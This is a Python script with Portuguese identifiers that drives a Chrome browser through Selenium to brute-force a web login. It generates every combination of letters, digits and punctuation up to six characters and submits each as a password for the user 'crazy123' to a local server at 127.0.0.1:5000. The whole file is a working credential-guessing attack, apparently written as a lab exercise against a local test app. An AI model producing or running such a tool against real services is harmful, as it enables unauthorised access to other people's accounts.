from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import itertools
import string
import time

def ataque_forca_bruta(url_base, username, tamanho_max_senha):
    driver = webdriver.Chrome()
    driver.get(url_base)
    
    caracteres_possiveis = string.ascii_letters + string.digits + string.punctuation
    #caracteres_possiveis = 'abc123'

    tentativas = 0

    for tamanho_senha in range(1, tamanho_max_senha + 1):
        for tentativa in itertools.product(caracteres_possiveis, repeat=tamanho_senha):
            senha_tentativa = ''.join(tentativa)
            tentativas += 1
            driver.get(f'{url_base}?username={username}&password={senha_tentativa}')
            time.sleep(0.1)
            if '/login' in driver.current_url:
                print(f'Senha encontrada: {senha_tentativa} em {tentativas} tentativas')
                time.sleep(5)
                driver.quit()
                return senha_tentativa, tentativas

    print(f'Senha não encontrada após {tentativas} tentativas.')
    driver.quit()
    return None, tentativas

url_base = 'http://127.0.0.1:5000'
username = 'crazy123'
tamanho_max_senha = 6

senha, tentativas = ataque_forca_bruta(url_base, username, tamanho_max_senha)
if senha:
    print(f'Senha quebrada: {senha} após {tentativas} tentativas.')
else:
    print("Senha não encontrada.")
